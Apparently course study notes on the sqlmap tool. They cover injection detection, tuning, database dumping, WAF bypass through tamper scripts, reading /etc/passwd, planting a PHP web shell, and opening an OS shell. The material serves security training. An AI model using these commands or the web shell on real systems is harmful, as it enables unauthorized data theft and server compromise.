```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.10.8#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
```

- Target connection, Injection detection, Fingerprinting
- Enumeration, Optimization, Protection detection and bypass using tamper scripts
- Database content retrieval, File system access, Execution of OS commands

## Basic usage

```sh
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

- --batch - skipping any required user-input

## SQLMap Output Description

### URL content is stable

- `target URL content is stable`
  - no major changes between responses in case of continuous identical requests

### Parameter appears to be dynamic

- `GET parameter 'param_name' appears to be dynamic`
  - sign that any changes made to its value would result in a change in the response and the parameter may be linked to a database

### Parameter might be injectable

- `heuristic (basic) test shows that GET parameter 'param_name' might be iinjectable (possible DBMS: 'MySQL')`
  - good indication of the potential SQLi
  - there was a MySQL error when SQLMap sends an intentionally invalid value
  - the tested parameter could be SQLi injectable and the target could be MySQL
  - not proof of SQLi

### Parameter might be vulnerable to XSS attacks

- `heuristic (XSS) test shows that GET parameter 'param_name' might be vulnerable to cross-site-scripting (XSS) attacks`
  - though it is not its primary purpose, SQLMap also run the test for the presence of an XSS vulns

### Back-end DBMS

- `it looks like the back-end DBMS is 'MySQL' Do you want to skip test payloads specific for other DBMSes? [Y/n]`

### Level/risk values

- `for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]`

### Reflective values found

- `reflective value(s) found and filtering out`
  - just warning that parts of the used payloads are found in the response

### Parameter appears to be injectable

- `GET parameter 'param_name' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")`
  - parameter appears to be injectable
  - may also be false positive

### Time-based comparison statistical model

- `time-based comparison requires a large statistical model, please wait.....(done)`

### Extending UNION query injection technique tests

- `automatically extending ranges for UNION query injection tecnhique tests as there is at least one other (potential) technique found`

### Technique appears to be usable

- `"ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"`

### Parameter is vulnerable

- `GET parameter 'param_name' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`
  - if we were running an extensive test on the web application and want to report all potential vulnerablilities, can continue searching

### Sqlmap identified injection points

- `sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:`

### Data logged to text files

- `fetched data logged to text files under '/path/to/write/file'`

---

# Running SQLMap on an HTTP Request

## cURL commands

- one of the best and easiest ways to properly set up an SQLMap request against the specific target (ie - web request with parameters inside) is by utilizing `Copy as cURL` feature from within Network Panel inside the browser

- then paste into command line, and changing the original command `curl` to `sqlmap`

```sh
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

- there are also parameter values that could be assessed for SQLi vulnerabilities or specialized options/switches for automatic parameter finding (eg - --crawl, --forms, -g)

## GET/POST Requests

- for GET parameters -> `-u/--url`
- for POST data -> `--data`

```sh
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

- in above, POST parameters uid and name will be tested for SQLi
- if we have a clear indication that the parameter uid is prone to a SQLi, can narrow down the tests to test only the uid by adding `-p uid` or can mark it inside the provided data with the usage of special marker `*`

```sh
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Full HTTP Requests

- if there are lots of different header values and an elongated POST body, we can use `-r` flag which needs to provide request file containing the whole HTTP request inside a single textual file which can be captured from within a proxy such as Burp

- eg

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

- in Burp, Copy to file
- in Browser, Copy > Copy Request Headers

```sh
sqlmap -r req.txt
```

- within the saved request file, we can specify the parameter we want to inject in with an asterisk (_), such as `/?id=_`

## Custom SQLMap Requests

- eg - if there is a requirement to specify the session cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` can be used as

```sh
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

OR with `-H/--header`

```sh
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

- other options

```
--host
--referer
-A/--user-agent
--random-agent 	// randomly select User-agent header value
--mobile 		// imitate the smartphone
```

- HTTP parameters can also be possible to test SQLi

```
--cookie="id=1*"
```

- change the request methods by `--method`

```sh
sqlmap -u www.target.com --data='id=1' --method PUT
```

## Custom HTTP Requests

- SQLMap also supports JSON formatted (eg - {"id": 1}) and XML formatted (eg - <element><id>1</id></element>) HTTP requests

- eg - in req.txt

```json
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

## Handling SQLMap Erorrs

1. `--parse-errors` - to parse the DBMS errors (if any) and displays them as part of the program run

2. `-t` - stores the whole traffic content to an output file

```sh
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

3. `-v` - verbosity level

```sh
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

4. `--proxy` - redirect the whole traffic through a proxy

---

# Attack Tuning

- In default, every payload sent to the target consists of
  - vector (eg - `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target
  - boundaries (eg - `<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement

## Prefix/Suffix

- in rare cases, there is a requirement for special prefix and suffix values
- `--prefix` , `--suffix`

```sh
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

- eg - source php code

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

- after injection with vector `UNION ALL SELECT 1,2,VERSION()` bounded with the prefix `%'))` and suffix `-- -`

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

## Level/Risk

- `--level` - 1-5, default 1

  - extends both vectors and boundaries being used, based on their expectancy of success (lower the expectancy, higher the level)

- `--risk` - 1-3, default 1

  - extends the used vector set based on their risk of causing problems at the target side (i.e - risk of database entry loss or DOS)

- ?? risk=3 -> contains OR operation

- best way to check for differnences between used boundaries and payloads for different values of --level and --risk is the usage of -v option to 3

```sh
Buggunterhac@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5

...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

```sh
Buggunterhac@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
```

```sh
Buggunterhac@htb[/htb]$ sqlmap -u www.example.com/?id=1
...SNIP...
[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
...SNIP...
```

```sh
Buggunterhac@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
...SNIP...
[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
...SNIP...
[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
...SNIP...
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
...SNIP...
[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
...SNIP...
```

- the number of payloads by default (--level=1 --risk=1) -> 72
- most detailed case (--level=5 --risk=3) -> 7865
- defualt options are good
- in special cases of SQLi, where usage of OR paylods (eg-in case of login pages), we must raise the risk level as OR payload are dangerous in default run

### Status Codes

- difference between TRUE and FASLE responses eg - 200 for TRUE and 500 for FALSE
- `--code=200`

### Title

- `--title` - instruct the detection mechanism to base the comparison based on the content of the HTML tag

### Strings

- in case of specific string value appearing in TRUE response (eg - welcome) while absent in FALSE response,
- `--string=welcome`

### Text-only

- dealing with a lot of hidden content, such as certain HTML page behaviors tag eg- \<script\>,\<style\>, etc can use `--text-only` switch

### Technique

- to narrow down the used payloads only to a certain type
- if the time-based blind payloads are causing in the form of response timeouts, if we want to force the usage of a specific SQLi payload type, use the option --technique
- --technique=BEU for Blind, Error based, UNION query payloads

### UNION SQLi Tuning

- if we have found the exact number of columns of the vuln SQL query, we can use this number in SQLMap option as `--union-cols=17`
- for specify the data type `--union-char='a'`

# Database Enumeration

- https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml

```xml
<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```

- if user want to retrieve banner (switch --banner)
- current user name - `--current-user`
- current database name - `--current-db` ,etc
- current user has DBA (administrator) right - `--is-dba`
- tables from database - `--tables -D testdb`
- format of table - `--dump-format`
- specifying dump columns - `--dump -T users -D testdb -C username,password`
- specifying rows - `--dump -T users -D testdb --start=2 --stop=3`
- conditional enumeration - `--dump -T users -D testdb --where="name LIKE 'adm%'"`
- `--dump-all --exclude-sysdbs`
- database schema - `--schema`
- search table name user - `--search -T user`
- search column name pass (like password) - `--search -C pass`

# Bypassing Web Application Protections

### for CSRF protection - `--csrf-token`

- usage

```sh
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

### for unique value bypass

- `--randomize`

```sh
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

### calculated parameter bypass

```sh
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

```

### IP Address Concealing

- if WAF blacklists our current IP, try to use a proxy or Tor
- proxy - `--proxy`
- if we have list of proxies, `--proxy-file`

### WAF Bypass

- sqlmap uses third party library identYwaf - https://github.com/stamparm/identYwaf
- if we want to skip this step, use `--skip-waf` (to produce less noise)

### User-agent Blacklisting Bypass

- in case of immediate problems (like 5xx from the start) while running sqlmap, it may be due to blacklisting of the default user-agent used by sqlmap (sqlmap/...)
- use `--random-agent`

### Tamper Scripts

- special kind of python scripts written for modifying requests just before being sent to the target to bypass some protection
- eg - between (https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) - replacing all occurrences of greater than operator(>) with `NOT BETWEEN 0 AND #` and equal operator (=) with `BETWEEN # AND #`
- `tamper=between,randomcase`
- ifnull2ifisnull - https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py
- appendnullbyte - https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py

- most notable temper scripts

| Tamper-Script             | Description                                                                                                                    |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| 0eunion                   | Replaces instances of UNION with eoUNION                                                                                       |
| base64encode              | base64 encodes all characters in a given payload                                                                               |
| between                   | replacing all occurrences of greater than operator(>) with `NOT BETWEEN 0 AND #` and equal operator (=) with `BETWEEN # AND #` |
| commalesslimit            | Replace (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                |
| equaltolike               | Replaces all occurrences of operator equal(=) with LIKE counterpart                                                            |
| halfversionedmorekeywords | Add (MySQL) versioned comment before each keyword                                                                              |
| modsecurityversioned      | embraces complete query with MySQL versioned comment                                                                           |
| modsecurityzeroversioned  | embraces complete query with MySQL zero-versioned comment                                                                      |
| percentage                | add a percentage sign (%) in front of each character (eg - SELECT -> %S%E%L%E%C%T)                                             |
| plus2concat               | replace plus operator (+) with MsSQL function CONCAT() counterpart                                                             |
| randomcase                | replaces each keyword character with random case value (eg- SELECT -> SEleCt)                                                  |
| space2comment             | replaces space character with comments                                                                                         |
| space2dash                | replaces space with a dash comment (--) followed by a random string and a new line                                             |
| space2hash                | replace MySQL instances of space with pound character (#) followed by a random string and a new line                           |
| space2mssqlblank          | replaces (MsSQL) space with random blank character from a valid set of alternate characters                                    |
| space2plus                | replaces space with plus                                                                                                       |
| space2randomblank         | replace space with random blank character from a valid set of alternative characters                                           |
| symboliclogical           | replaces AND and OR operators with their symbolic `&&` and                                                                     |
| versionedkeywords         | encloses each non-function keyword with MySQL versioned comment                                                                |
| versionedmorekeywords     | encloses each keyword with MySQL version comment                                                                               |

- `--list-tempers`
- `--chunked` - split the POST requests body into chunked
- by HTTP parameter pollution
  - eg - ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...

# OS Exploitation

## File Read/Write

1. check for DBA privileges

```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

- if return False, we don't have DBA access

2. Reading local files

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

- will output in your local storage

3. Writing local files

- can use `--file-write` and `--file-dest`

```sh
❯ echo '<?php system($_GET["cmd"]); ?>' > shell.php
❯ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
❯ curl http://www.example.com/shell.php?cmd=ls+-la
```

## OS Command Execution

```
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

- SQLMap default to UNION technique to get an OS shell
- if failed with UNION technique

```
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
